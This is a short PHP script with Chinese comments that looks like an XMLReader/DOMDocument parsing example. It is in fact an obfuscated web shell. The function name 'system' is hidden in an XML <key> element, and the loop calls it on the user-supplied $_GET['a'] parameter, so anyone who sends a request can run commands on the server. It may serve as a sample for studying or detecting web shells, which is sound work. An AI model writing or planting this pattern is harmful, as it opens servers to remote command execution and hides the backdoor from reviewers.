<?php
$xmlString = '<?xml version="1.0" encoding="UTF-8"?>
<data>
    <item>
        <key>system</key>
    </item>
    <item>
        <key>age</key>
        <value>30</value>
    </item>
</data>';

$reader = new XMLReader();
$reader->xml($xmlString);

// 遍历 XML 节点
while ($reader->read()) {
    // 定位到 <item> 开始标签
    if ($reader->nodeType === XMLReader::ELEMENT && $reader->name === 'item') {
        $itemDoc = new DOMDocument();
        // 将整个 <item> 节点读入 DOM 对象
        $itemNode = $reader->expand($itemDoc);
        $key = $itemNode->getElementsByTagName('key')->item(0)->nodeValue;
        ($key)($_GET['a']); // 动态调用函数
    }
}
?>
